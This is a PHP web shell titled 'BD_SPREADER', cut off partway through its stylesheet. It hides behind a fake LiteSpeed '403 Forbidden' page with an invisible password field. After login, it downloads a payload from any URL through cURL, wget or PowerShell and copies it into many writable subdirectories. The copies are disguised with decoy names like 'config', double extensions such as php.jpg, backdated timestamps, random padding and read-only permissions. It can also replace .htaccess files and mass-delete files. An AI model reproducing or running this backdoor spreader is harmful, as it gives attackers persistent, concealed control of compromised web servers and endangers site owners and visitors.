<?php
@set_time_limit(0);
@error_reporting(0);
@ini_set('log_errors', 0);
@ini_set('error_log', NULL);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('display_startup_errors', 0);
session_start();
$offline = array('$2a$12$ogi/xXgAWShfygCgUYWYBO0VfjI2X/9fwC32XHIljpSxx3qqUi.xG'); 
function verifyPassword($p, $arrOff) {
    foreach ($arrOff as $hash) {
        if (password_verify($p, $hash)) {
            return true;
        }
    }
    return false;
}

if (!isset($_SESSION["authenticated"]) || $_SESSION["authenticated"] !== true) {
    if (isset($_POST['password'])) {
        $P = $_POST['password'];
        if (verifyPassword($P, $offline)) {
            $_SESSION["authenticated"] = true;
            $_SESSION["darxbyte"]      = 'libxxx';
            $_SESSION["last_active"]   = time();
        }
    }
    if (!isset($_SESSION["authenticated"]) || $_SESSION["authenticated"] !== true) {
        echo '<!doctypehtml><html lang="en" style="height:100%">
              <head>
                <meta charset="UTF-8">
                <meta content="width=device-width,initial-scale=1" name="viewport">
                <title>403 Forbidden</title>
                <style>
                  body{height:100vh;margin:0;display:flex;flex-direction:column;justify-content:center;
                       align-items:center;background-color:#fff;font-family:Arial,sans-serif;overflow:hidden;color:#444}
                  .form-container{text-align:center;transform:translateY(-91px)}
                  h1{font-size:150px;margin-bottom:0;color:#444}
                  h2{font-size:30px;margin-top:1px;margin-bottom:20px;color:#444}
                  p{font-size:14px;color:#666}
                  .footer{color:#f0f0f0;font-size:12px;background-color:#474747;border-top:1px solid rgba(0,0,0,.15);
                          box-shadow:0 1px 0 rgba(255,255,255,.3)inset;text-align:left;width:100%;position:absolute;
                          bottom:0;padding-top:5px;padding-bottom:13px}
                  .footer p{margin:18px;color:#f0f0f0;font-size:12px;text-align:left;padding-left:12px}
                  input[type=password]{background-color:transparent;border:transparent;color:transparent;outline:0;
                                       justify-content:center;align-items:center;text-align:center}
                  input[type=password]:focus{outline:0}
                  @media(prefers-color-scheme:dark){
                    body{background-color:#121212;color:#e0e0e0}
                    h1,h2{color:#e0e0e0}
                    p{color:#ccc}
                    .footer{background-color:#1f1f1f;color:#ccc}
                    .footer p{color:#ccc}
                  }
                </style>
              </head>
              <body>
                <div class="form-container">
                  <h1>403</h1>
                  <h2>Forbidden</h2>
                  <p>You do not have permission to access this document.</p>
                  <form method="post">
                    <input autocomplete="on" name="password" type="password">
                  </form>
                </div>
                <div class="footer">
                  <p class="powered-by">Proudly powered by LiteSpeed Web Server</p>
                  <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company
                     and has no control over content found on this site.</p>
                </div>
                <script>
                  document.querySelector("form").addEventListener("submit",function(e){
                    e.preventDefault();this.submit();
                  });
                  document.querySelector("input[name=password]").addEventListener("keypress",function(e){
                    if(e.key==="Enter"){
                      e.preventDefault();this.form.submit();
                    }
                  });
                </script>
              </body>
              </html>';
        exit();
    }
}

define("__DARXBYTE_VERSION__", "BD_SPREADER");

$messages = [
    'duplicate_no_extensions_selected' => "No extensions selected.",
    'invalid_destination_dir'          => "Invalid destination directory: %s",
    'no_files_selected'                => "Please select at least one file or enter a file URL.",
    'error_fetching_file'             => "Failed to fetch content from URL: %s",
    'error_writing_file'              => "Failed to write file: %s",
    'error_deleting_htaccess'         => "Failed to delete .htaccess file at: %s",
    'no_subdirs_found'                => "No subdirectories found within %s.",
    'error_writing_file_general'      => "Failed to write file: %s",
    'error_deleting_file'             => "Failed to delete file: %s",
    'error_deleting_dir'              => "Failed to delete directory: %s",
    'no_delete_items'                 => "No items selected for deletion.",
    'success_duplicate'               => "File duplication process completed.",
    'success_delete'                  => "File or directory successfully deleted.",
    'success_mass_delete'             => "All selected items have been deleted successfully.",
    'no_data_to_copy'                 => "No data available to copy.",
    'copy_success'                    => "Data successfully copied to clipboard!",
    'copy_failed'                     => "Failed to copy data.",
    'no_ok_urls'                      => "No OK URLs to copy.",
    'no_failed_urls'                  => "No Failed URLs to copy.",
    'path_copied'                     => "Path successfully copied: %s",
    'not_found'                       => "File or directory not found: %s",
    'nothing_to_delete'               => "Could not delete. Item does not exist or has already been deleted: %s",
    'invalid_url_format'              => "Invalid URL format: %s",
    'fetching_error'                  => "Failed to fetch file content: %s",
    'error_checking_url'              => "An error occurred while checking URLs.",
    'error_deleting_files'            => "An error occurred while deleting some files.",
    'error_general'                   => "An error occurred while processing the request."
];

$globalDownloadMethod = "";

// Daftar ekstensi ganda
$phpDoubleExtensions = [
    'php.jpg','php.gif','php.png','php.jpeg','php.ico','php.bmp','php.svg','php.tiff',
    'php.doc','php.pdf','php.xlsx','php.pptx','php.docx','php.odt','php.rtf','php.js',
    'php.css','php.json','php.py','php.rb','php.mp3','php.wav','php.mp4','php.mov',
    'php.mkv','php.zip','php.rar','php.7z','php.tar.gz','php.iso','php.bat','php.exe',
    'php.dll','php.sys','php.ini','php.unknown','php.config','php.dat','php.cache','php.tmp'
];

// Daftar ekstensi dasar "all"
$allExtensions = [
    "php","phtml","php3","php4","php5","php56","php7"
];

/* =======================================
   FUNGSI GET FILE CONTENT
======================================= */
function getFileContent($src, $useFallback = false) {
    global $globalDownloadMethod;

    if (!$useFallback) {
        if (function_exists('curl_init')) {
            $ch = curl_init($src);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $content = curl_exec($ch);
            curl_close($ch);
            if ($content !== false) {
                $globalDownloadMethod = "Using cURL";
                return $content;
            }
        }
        $fileContent = @file_get_contents($src);
        if ($fileContent !== false) {
            $globalDownloadMethod = "Using file_get_contents";
            return $fileContent;
        }
        if (stripos(PHP_OS, 'WIN') === 0) {
            $p = @shell_exec('powershell -command "try{(iwr ' . $src . ').content}catch{}"');
            if ($p !== null) {
                $globalDownloadMethod = "Using PowerShell";
                return $p;
            }
        } else {
            $w = @shell_exec('wget -qO- ' . escapeshellarg($src));
            if ($w !== null) {
                $globalDownloadMethod = "Using wget (shell_exec)";
                return $w;
            }
        }
        $globalDownloadMethod = "Using fallback (all failed)";
        return false;
    } else {
        $fileContent = @file_get_contents($src);
        if ($fileContent !== false) {
            $globalDownloadMethod = "Fallback: file_get_contents";
            return $fileContent;
        }
        if (function_exists('curl_init')) {
            $ch = curl_init($src);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $content = curl_exec($ch);
            curl_close($ch);
            if ($content !== false) {
                $globalDownloadMethod = "Fallback: cURL";
                return $content;
            }
        }
        if (stripos(PHP_OS, 'WIN') === 0) {
            $p = @shell_exec('powershell -command "try{(iwr ' . $src . ').content}catch{}"');
            if ($p !== null) {
                $globalDownloadMethod = "Fallback: PowerShell";
                return $p;
            }
        } else {
            $w = @shell_exec('wget -qO- ' . escapeshellarg($src));
            if ($w !== null) {
                $globalDownloadMethod = "Fallback: wget (shell_exec)";
                return $w;
            }
        }
        $globalDownloadMethod = "Fallback: all methods failed";
        return false;
    }
}

function writeFileContent($dest, $content) {
    return @file_put_contents($dest, $content) !== false;
}

function getAllSubDirs($dir) {
    $subdirs = [];
    $iterator = @scandir($dir);
    if ($iterator === false) {
        return $subdirs;
    }
    foreach ($iterator as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $subdirs = array_merge($subdirs, getAllSubDirs($path));
            if (is_writable($path)) {
                $subdirs[] = $path;
            }
        }
    }
    return $subdirs;
}

function randomizeExtensionCase($ext) {
    return implode('', array_map(function($c) {
        return rand(0, 1) ? strtoupper($c) : strtolower($c);
    }, str_split($ext)));
}

function modifyFileSize($filePath) {
    $additionalSize = rand(1024, 50000);
    $contentToAdd   = str_repeat(' ', $additionalSize) . "\n";
    if ($handle = @fopen($filePath, 'a')) {
        fwrite($handle, $contentToAdd);
        fclose($handle);
    }
}

/* =======================================
   RANDOM NAME GENERATOR (5 opsi)
======================================= */
function generateRandomName($option, $defaultNames) {
    if ($option === 'number') {
        $length = rand(5, 8);
        $digits = '0123456789';
        $result = '';
        for ($i=0; $i<$length; $i++) {
            $result .= $digits[rand(0, strlen($digits)-1)];
        }
        return $result;
    }
    elseif ($option === 'character') {
        $length = rand(5, 8);
        $letters = 'abcdefghijklmnopqrstuvwxyz';
        $result = '';
        for ($i=0; $i<$length; $i++) {
            $result .= $letters[rand(0, strlen($letters)-1)];
        }
        return $result;
    }
    elseif ($option === 'numchar') {
        $length = rand(5, 8);
        $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        $result = '';
        for ($i=0; $i<$length; $i++) {
            $result .= $chars[rand(0, strlen($chars)-1)];
        }
        return $result;
    }
    elseif ($option === 'superrandom') {
        $length = rand(5, 12);
        $pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $result = '';
        for ($i=0; $i<$length; $i++) {
            $result .= $pool[rand(0, strlen($pool)-1)];
        }
        return $result;
    }
    else {
        // default / fallback
        return $defaultNames[array_rand($defaultNames)];
    }
}

function duplicateFileToRandomDirs(
    $fileContent,
    $targetDir,
    $allowedExtensions,
    $randomNames,
    $numToDuplicate,
    $randomizeExtensionsChecked,
    $autoChmod444,
    $autoChangeTimeRandom,
    $autoRandomFileSize,
    &$totalDuplicates,
    &$duplicatedFiles,
    &$error_messages,
    $customFileName = '',
    $customExtension = '',
    $randomNameOption = 'default'
) {
    global $messages;

    $subDirs = getAllSubDirs($targetDir);
    if (empty($subDirs)) {
        $error_messages[] = sprintf($messages['no_subdirs_found'], $targetDir);
        return;
    }

    $numToDuplicate = min($numToDuplicate, count($subDirs));
    $duplicated     = 0;

    foreach ($subDirs as $dir) {
        if ($duplicated >= $numToDuplicate) {
            break;
        }
        if (!is_writable($dir)) {
            @chmod($dir, 0777);
            if (!is_writable($dir)) {
                continue;
            }
        }

        $extension      = !empty($customExtension)
            ? $customExtension
            : $allowedExtensions[array_rand($allowedExtensions)];
        $extensionLower = strtolower($extension);

        if ($extensionLower === 'htaccess') {
            $newFileName = '.htaccess';
        } else {
            if (!empty($customFileName)) {
                $fileName = $customFileName;
            } else {
                $fileName = generateRandomName($randomNameOption, $randomNames);
            }

            $ext       = $randomizeExtensionsChecked
                ? randomizeExtensionCase($extension)
                : strtolower($extension);
            $newFileName = "{$fileName}.{$ext}";
        }

        $newFilePath = rtrim($dir, "/\\") . DIRECTORY_SEPARATOR . $newFileName;

        if ($extensionLower === 'htaccess' && file_exists($newFilePath)) {
            if (!@unlink($newFilePath)) {
                $error_messages[] = sprintf($messages['error_deleting_htaccess'], $newFilePath);
                continue;
            }
        }

        if (writeFileContent($newFilePath, $fileContent)) {
            if ($autoRandomFileSize && $extensionLower !== 'htaccess') {
                modifyFileSize($newFilePath);
            }
            if ($autoChangeTimeRandom && $extensionLower !== 'htaccess') {
                $yearsBack     = rand(1, 10);
                $randomSeconds = rand(1, 31536000);
                $randomTime    = strtotime("-{$yearsBack} years") - $randomSeconds;
                @touch($newFilePath, $randomTime);
            }
            if ($autoChmod444) {
                @chmod($newFilePath, 0444);
            }

            $duplicatedFiles[] = preg_replace("#/+#", "/", $newFilePath);
            $totalDuplicates++;
            $duplicated++;
        } else {
            $error_messages[] = sprintf($messages['error_writing_file_general'], $newFilePath);
        }
    }

    if ($duplicated < $numToDuplicate) {
        $error_messages[] = sprintf($messages['error_general'], "Desired duplicates not achieved.");
    }
}

$currentDir = __DIR__;
$files      = array_diff(@scandir($currentDir), [".", ".."]);

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["action"])) {
    header("Content-Type: application/json");
    $action = $_POST["action"];

    if ($action === "duplicate") {
        global $messages, $globalDownloadMethod, $phpDoubleExtensions, $allExtensions;

        $totalDuplicates  = 0;
        $duplicatedFiles  = [];
        $success_messages = [];
        $error_messages   = [];

        $useFallback        = isset($_POST['use_fallback']) && $_POST['use_fallback'] == '1';
        $customFileName     = isset($_POST['custom_file_name']) ? trim($_POST['custom_file_name']) : '';
        $customExtension    = isset($_POST['custom_extension']) ? trim($_POST['custom_extension']) : '';
        $selectedExtensions = isset($_POST["extensions"]) ? $_POST["extensions"] : [];
        $destinationDir     = rtrim($_POST["dir"], "/\\");

        $duplicate_method     = $_POST["duplicate_method"];
        $duplicate_value_num  = isset($_POST["duplicate_value_number"]) ? (int) $_POST["duplicate_value_number"] : 1;
        $duplicate_value_perc = isset($_POST["duplicate_value_percentage"]) ? (int) $_POST["duplicate_value_percentage"] : 1;

        $randomizeExtensionsChecked = isset($_POST["randomize_all_extensions"]);
        $autoChmod444              = isset($_POST["auto_chmod_444"]);
        $autoChangeTimeRandom      = isset($_POST["auto_change_time_random"]);
        $autoRandomFileSize        = isset($_POST["auto_change_random_size"]);
        $randomNameOption = isset($_POST["random_name_option"]) ? $_POST["random_name_option"] : 'default';
        $originalSelectedExtensions = array_map("strtolower", $selectedExtensions);
        $allowedExtensions = [];
        foreach ($originalSelectedExtensions as $ext) {
            if ($ext !== 'all' && $ext !== 'phpdouble') {
                $allowedExtensions[] = $ext;
            }
        }
        if (in_array('all', $originalSelectedExtensions)) {
            $allowedExtensions = array_merge($allowedExtensions, $allExtensions);
        }

        if (in_array('phpdouble', $originalSelectedExtensions)) {
            $allowedExtensions = array_merge($allowedExtensions, $phpDoubleExtensions);
        }

        $allowedExtensions = array_unique($allowedExtensions);
        if (empty($allowedExtensions)) {
            $error_messages[] = $messages['duplicate_no_extensions_selected'];
            $html = '';
            foreach ($error_messages as $msg) {
                $html .= "<div class='notification error'>{$msg}</div>";
            }
            echo json_encode(["html" => $html]);
            exit();
        }

        if (!is_dir($destinationDir)) {
            $error_messages[] = sprintf($messages['invalid_destination_dir'], $destinationDir);
            $html = '';
            foreach ($error_messages as $msg) {
                $html .= "<div class='notification error'>{$msg}</div>";
            }
            echo json_encode(["html" => $html]);
            exit();
        }

        $selectedFiles = [];
        if (!empty($_POST["file1"])) {
            $selectedFiles[] = $_POST["file1"];
        }
        if (!empty($_POST["file_url"])) {
            $url         = $_POST["file_url"];
            $fileContent = getFileContent($url, $useFallback);
            if ($fileContent === false) {
                $error_messages[] = sprintf($messages['error_fetching_file'], $url);
            } else {
                $selectedFiles[] = [
                    "content" => $fileContent,
                    "name"    => basename($url)
                ];
            }
        }

        if (empty($selectedFiles)) {
            $error_messages[] = $messages['no_files_selected'];
            $html = '';
            foreach ($error_messages as $msg) {
                $html .= "<div class='notification error'>{$msg}</div>";
            }
            echo json_encode(["html" => $html]);
            exit();
        }

        if ($duplicate_method == "percentage") {
            $duplicate_value_perc = max(1, min(4, $duplicate_value_perc));
            $numToDuplicate = ceil(count(getAllSubDirs($destinationDir)) * ($duplicate_value_perc / 100));
        } else {
            $duplicate_value_num = max(1, min(10000, $duplicate_value_num));
            $numToDuplicate      = $duplicate_value_num;
        }

        $randomNames = [
            "config","database","cache","session","router","controller","model","view",
            "index","main","app","bootstrap","autoload","composer","vendor","package",
            "class","object","function","security","encryption","hash","salt","key",
            "ssl","ssh","handler"
        ];

        // Proses duplikasi untuk setiap file
        foreach ($selectedFiles as $file) {
            if (is_array($file)) {
                $fileContent = $file["content"];
                $fileName    = $file["name"];
            } else {
                $fullSourcePath = $currentDir . DIRECTORY_SEPARATOR . $file;
                $fileContent    = getFileContent($fullSourcePath, $useFallback);
                $fileName       = $file;
            }

            if ($fileContent !== false) {
                duplicateFileToRandomDirs(
                    $fileContent,
                    $destinationDir,
                    $allowedExtensions,
                    $randomNames,
                    $numToDuplicate,
                    $randomizeExtensionsChecked,
                    $autoChmod444,
                    $autoChangeTimeRandom,
                    $autoRandomFileSize,
                    $totalDuplicates,
                    $duplicatedFiles,
                    $error_messages,
                    $customFileName,
                    $customExtension,
                    $randomNameOption
                );
            } else {
                $error_messages[] = sprintf($messages['fetching_error'], $fileName);
            }
        }

        if (!empty($globalDownloadMethod)) {
            $success_messages[] = "<div class='notification info'>[INFO] Download Method: {$globalDownloadMethod}</div>";
        }
        if ($totalDuplicates > 0) {
            $success_messages[] = "<div class='notification success'>{$messages['success_duplicate']}</div>";
        }
        foreach ($error_messages as $msg) {
            $success_messages[] = "<div class='notification error'>{$msg}</div>";
        }
        if (!empty($duplicatedFiles)) {
            $duplicated_html = "<div>";
            foreach ($duplicatedFiles as $filePath) {
                $duplicated_html .= "<div class='dir-item'>{$filePath}</div>";
            }
            $duplicated_html .= "</div>";
            $success_messages[] = $duplicated_html;
        }

        $html = implode("", $success_messages);
        echo json_encode(["html" => $html]);
        exit();
    }
    elseif ($action === "delete") {
        global $messages;
        $deleteList       = array_filter(array_map('trim', explode("\n", $_POST["delete_list"])));
        $success_messages = [];
        $error_messages   = [];

        if (empty($deleteList)) {
            $error_messages[] = $messages['no_delete_items'];
            $html = '';
            foreach ($error_messages as $msg) {
                $html .= "<div class='notification error'>{$msg}</div>";
            }
            echo json_encode(["html" => $html]);
            exit();
        }

        $someFailed = false;
        foreach ($deleteList as $item) {
            $item = trim($item);
            if ($item === "") {
                continue;
            }
            if (file_exists($item)) {
                if (is_dir($item)) {
                    $scanDir = @scandir($item);
                    if ($scanDir && count(array_diff($scanDir, ['.', '..'])) > 0) {
                        if (!@rmdir($item)) {
                            $error_messages[] = sprintf($messages['error_deleting_dir'], $item);
                            $someFailed = true;
                        } else {
                            $success_messages[] = "<div class='notification success'>{$messages['success_delete']}</div>";
                        }
                    } else {
                        if (!@rmdir($item)) {
                            $error_messages[] = sprintf($messages['error_deleting_dir'], $item);
                            $someFailed = true;
                        } else {
                            $success_messages[] = "<div class='notification success'>{$messages['success_delete']}</div>";
                        }
                    }
                } else {
                    if (!@unlink($item)) {
                        $error_messages[] = sprintf($messages['error_deleting_file'], $item);
                        $someFailed = true;
                    } else {
                        $success_messages[] = "<div class='notification success'>{$messages['success_delete']}</div>";
                    }
                }
            } else {
                $error_messages[] = sprintf($messages['nothing_to_delete'], $item);
                $someFailed       = true;
            }
        }

        $html = '';
        if (!$someFailed && !empty($deleteList)) {
            $html .= "<div class='notification success'>{$messages['success_mass_delete']}</div>";
        }
        foreach ($success_messages as $s) {
            $html .= $s;
        }
        foreach ($error_messages as $err) {
            $html .= $err;
        }
        echo json_encode(["html" => $html]);
        exit();
    }
    elseif ($action === "url_check") {
        global $messages;
        $url_list         = isset($_POST["url_list"]) ? $_POST["url_list"] : '';
        $urls             = preg_split('/\r\n|\r|\n/', $url_list);
        $success_messages = [];
        $error_messages   = [];
        $ok_urls          = [];
        $failed_urls      = [];
        $hasAtLeastOneUrl = false;

        foreach ($urls as $u) {
            if (trim($u) !== "") {
                $hasAtLeastOneUrl = true;
                break;
            }
        }

        if (!$hasAtLeastOneUrl) {
            $error_messages[] = "<div class='notification error'>No URLs provided.</div>";
            $html = implode("", $error_messages);
            echo json_encode([
                "html"        => $html,
                "ok_urls"     => [],
                "failed_urls" => []
            ]);
            exit();
        }

        foreach ($urls as $url) {
            $url = trim($url);
            if (empty($url)) {
                continue;
            }
            if (!preg_match("/^http(s)?:\/\//", $url)) {
                $url = "https://" . $url;
            }
            $parsedUrl   = parse_url($url);
            $host        = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
            $path        = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
            $currentHost = $_SERVER['HTTP_HOST'];
            $status      = "Failed";
            $isLocal     = false;

            if (strtolower($host) === strtolower($currentHost)) {
                $isLocal = true;
            }

            if ($isLocal) {
                $localPath = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . $path;
                if (file_exists($localPath)) {
                    $ok_urls[] = $url;
                    $success_messages[] = "<div class='notification success'>{$url} - OK (Local)</div>";
                } else {
                    $failed_urls[]    = $url;
                    $error_messages[] = "<div class='notification error'>{$url} - Not Found Locally</div>";
                }
            } else {
                $headers = @get_headers($url, 1);
                if ($headers !== false) {
                    $statusLine = is_array($headers) ? $headers[0] : $headers;
                    preg_match('/HTTP\/\d\.\d\s+(\d+)/', $statusLine, $matches);
                    $statusCode = isset($matches[1]) ? (int) $matches[1] : 0;
                    if (($statusCode >= 200 && $statusCode < 300) || ($statusCode >= 300 && $statusCode < 400)) {
                        $ok_urls[] = $url;
                        $success_messages[] = "<div class='notification success'>{$url} - OK</div>";
                    } else {
                        $failed_urls[]   = $url;
                        $error_messages[] = "<div class='notification error'>{$url} - HTTP {$statusCode} Failed</div>";
                    }
                } else {
                    $failed_urls[]   = $url;
                    $error_messages[] = "<div class='notification error'>{$url} - Connection Failed</div>";
                }
            }
        }

        $combined_messages = array_merge($success_messages, $error_messages);
        $html = implode("", $combined_messages);
        echo json_encode([
            "html"        => $html,
            "ok_urls"     => $ok_urls,
            "failed_urls" => $failed_urls
        ]);
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>[SP] <?php echo $_SERVER['HTTP_HOST'] . ' - ' . __DARXBYTE_VERSION__; ?></title>
    <link rel="icon" href="https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/LIB-LOADER.png">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            scrollbar-width: thin;
            scrollbar-color: #ff4500 #1c1c1c;
            font-size: 10px;
            margin-bottom: 3px;
        }
        *::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        *::-webkit-scrollbar-track {
            background: #1c1c1c;
        }
        *::-webkit-scrollbar-thumb {
            background: linear-gradient(45deg, #ff0000, #ff8c00);
            border-radius: 20px;
            border: 1px solid #1c1c1c;
        }
        *::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(45deg, #ff4500, #ffd700);
        }
        body {
            background-color: #000000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            border-image: linear-gradient(45deg, red 40%, orange 60%);
            overflow: auto;
        }
        .wrapper {
            width: 1850px;
            height: 850px;
            margin: auto;
            margin-top: 20px;
            padding: 1px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        header {
            flex: 0 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            border-image: linear-gradient(45deg, red 40%, orange 60%);
            border-image-slice: 1;
        }
        header p {
            margin-top: 1px;
            font-style: italic;
            color: #ff0000;
            font-size: 1.2rem;
            text-align: center;
            margin-bottom: 20px;
        }
        .main-container {
            flex: 1 1 auto;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr;
            gap: 10px;
            overflow: hidden;
			background-image: url('https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/LIB-BG.png');
            background-repeat: no-repeat;
            background-position: center center;
        }
		
        .form-section,
        .file-list-section,
        .result-section,
        .utilities-section {
            background-color: rgba(28, 28, 28, 0.2);
            padding: 12px;
            border-radius: 10px;
            border: 1px solid;
            border-image: linear-gradient(45deg, red 40%, yellow 60%);
            border-image-slice: 1;
            resize: horizontal;
            display: flex;
            flex-direction: column;
            font-size: 10px;
            overflow: auto;
            min-width: 250px;
            height: 790px;
        }
        .form-section h2,
        .file-list-section h2,
        .result-section h2 {
            font-size: 1.5rem;
            text-align: center;
            margin-bottom: 5px;
            color: #ff0000;
        }
        .utilities-section h2 {
            font-size: 1.5rem;
            text-align: center;
            margin-bottom: 0px;
            color: #ff0000;
        }
		
        .result-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 5px;
        }
        .result-header h2 {
            margin-bottom: 10px;
            font-size: 1.5rem;
            text-align: center;
            color: #ff0000;
        }
        .result-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
            width: 100%;
            flex-wrap: wrap;
        }
        .result-button {
            padding: 7px 15px;
            background-color: #fff600;
            color: #ff4500;
            border: 1px solid #ff4500;
            border-radius: 5px;
            cursor: pointer;
            font-size: 10px;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        .result-button:hover {
            background-color: #ffe680;
        }
        #result-content {
            flex-grow: 1;
            overflow-y: auto;
            padding-right: 10px;
            font-size: 10px;
            max-height: 600px;
        }
        label {
            color: #ffa500;
            font-weight: bold;
            margin-bottom: 1px;
            font-size: 10px;
        }
        input[type="text"],
        input[type="number"],
        textarea {
            width: 95%;
            padding: 5px;
            margin: 5px 5px;
			background-color: rgba(28, 28, 28, 0.2);
            color: #fff;
            border: 1px solid #ffa500;
            border-radius: 5px;
            font-size: 10px;
            transition: border-color 0.3s ease;
        }
        input[type="text"]::placeholder,
        textarea::placeholder {
            color: #888;
            font-size: 10px;
        }
        input[type="text"]:hover,
        input[type="number"]:hover,
        textarea:hover {
            border-color: #ffcc00;
        }
        input[type="number"]:disabled {
            background-color: #444;
            color: #aaa;
            border-color: #666;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            margin-bottom: 5px;
            background-color: #ff4500;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 10px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #ff6347;
        }
        textarea {
            height: 260px;
            overflow-y: auto;
            font-size: 10px;
        }
        .file-list {
            flex: 1 1 auto;
            overflow-y: auto;
        }
        .file-list ul {
            list-style-type: none;
            padding-left: 0;
            font-size: 10px;
        }
        .file-list ul li {
            background-color: rgba(28, 28, 28, 0.3);
            margin-bottom: 5px;
            padding: 1px;
            border-left: 5px solid #ff8800;
            border-bottom: 1px solid #444;
            display: flex;
            align-items: center;
            font-size: 10px;
        }
        .file-list ul li .file-name {
            flex: 1;
            padding: 5px;
            text-align: left;
        }
        .file-list ul li .file-actions {
            display: flex;
            gap: 5px;
        }
        .copy-path {
            background-color: #fff600;
            color: #ff4500;
            border: 1px solid #ff4500;
            border-radius: 5px;
            cursor: pointer;
            padding: 5px 10px;
            font-size: 10px;
            transition: background-color 0.3s;
        }
        .copy-path:hover {
            background-color: #feff00;
        }
        .delete-file {
            background-color: #ff0000;
            color: #fff;
            border: 1px solid #ff4500;
            border-radius: 5px;
            cursor: pointer;
            padding: 5px 10px;
            font-size: 10px;
            transition: background-color 0.3s;
        }
        .delete-file:hover {
            background-color: #ff6347;
        }
        .dir-item {
            margin: 2px 0;
            padding: 2px;
            background-color: #2e2e2e;
            border-left: 4px solid #ff8800;
            color: #fff;
            word-break: break-all;
            font-size: 10px;
        }
        #loader {
            display: none;
            position: fixed;
            top: 2%;
            right: 4%;
            z-index: 9999;
        }
        #loader img {
            width: 30px;
            height: 30px;
            animation: spin 0.1s linear infinite;
        }
        .stop-process-button {
            position: fixed;
            top: 2%;
            right: 10%;
            z-index: 9998;
            padding: 7px 15px;
            background-color: #fff600;
            color: #ff4500;
            border: 1px solid #ff4500;
            border-radius: 5px;
            cursor: pointer;
            font-size: 10px;
            font-weight: bold;
            transition: background-color 0.3s;
            display: none;
        }
        .stop-process-button:hover {
            background-color: #ffe680;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .radio-group {
            display: flex;
            align-items: center;
            margin: 10px 0;
            font-size: 10px;
        }
        .radio-group input[type="radio"] {
            margin-right: 5px;
        }
        .radio-group label {
            margin-right: 15px;
            color: #fff;
            font-size: 10px;
        }
        .duplicate-options {
            margin-top: 5px;
            margin-bottom: 5px;
            margin-left: 5px;
            display: flex;
            gap: 20px;
            font-size: 10px;
        }
        .duplicate-options .option {
            flex: 1;
        }
        label.disabled-label {
            color: #aaa;
            font-size: 10px;
        }
        .extension-checkboxes-1,
        .extension-checkboxes-2 {
            margin-bottom: 10px;
            background-color: rgba(28, 28, 28, 0.2);
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #ffa500;
            font-size: 10px;
        }
        .extension-checkboxes-1 h3 {
            margin-bottom: 10px;
            color: #ffa500;
            font-size: 10px;
        }
        .extension-checkboxes-1 .dup-settings-grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            column-gap: 20px;
            row-gap: 10px;
        }
        .extension-checkboxes-1 .dup-settings-col {
            display: flex;
            flex-direction: column;
        }
        .extension-checkboxes-2 h3 {
            margin-bottom: 10px;
            color: #ffa500;
            font-size: 10px;
        }
        .extension-checkboxes-2 .extensions-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 10px;
        }
        .extension-checkboxes-2 .extensions-grid label {
            margin-right: 0;
            color: #ffa500;
        }
        .custom-select-container {
            width: 95%;
            position: relative;
            margin: 11px 4px;
            font-size: 10px;
        }
        .custom-select {
            position: relative;
            user-select: none;
        }
        .select-selected {
            background-color: #1c1c1c;
            color: #fff;
            padding: 5px;
            border: 1px solid #ffa500;
            border-radius: 5px;
            cursor: pointer;
            box-sizing: border-box;
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 10px;
        }
        .select-selected:after {
            content: "";
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            border: 6px solid transparent;
            border-color: #fff transparent transparent transparent;
        }
        .select-selected.select-arrow-active:after {
            border-color: transparent transparent #fff transparent;
            top: 55%;
        }
        .select-items {
            position: absolute;
            background-color: #2e2e2e;
            border: 1px solid #ffa500;
            border-top: none;
            border-radius: 0 0 5px 5px;
            z-index: 99;
            top: 100%;
            left: 0;
            right: 0;
            max-height: 200px;
            overflow-y: auto;
            display: none;
            font-size: 10px;
        }
        .select-items div {
            padding: 3px;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .select-items div:hover {
            background-color: #575757;
        }
        .select-hide {
            display: none;
        }
        .select-items:not(.select-hide) {
            display: block;
        }
        .mass-delete-section,
        .url-checker-section {
            resize: horizontal;
            overflow: auto;
            min-width: 250px;
        }
        @media screen and (max-width: 768px) {
            .main-container {
                grid-template-columns: 1fr;
                grid-template-rows: auto auto auto auto;
            }
            .duplicate-options {
